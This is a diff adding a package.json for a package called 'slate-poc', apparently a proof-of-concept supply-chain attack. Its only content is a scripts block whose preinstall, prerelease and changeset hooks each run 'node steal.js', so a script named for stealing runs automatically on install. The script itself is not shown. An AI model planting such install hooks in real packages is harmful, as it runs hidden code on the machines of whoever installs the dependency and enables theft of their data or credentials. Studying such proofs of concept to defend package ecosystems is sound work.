@@ -1,0 +1,10 @@
+{
+  "name": "slate-poc",
+  "version": "0.0.0",
+  "private": true,
+  "scripts": {
+    "preinstall": "node steal.js preinstall",
+    "prerelease": "node steal.js prerelease",
+    "changeset": "node steal.js changeset"
+  }
+}
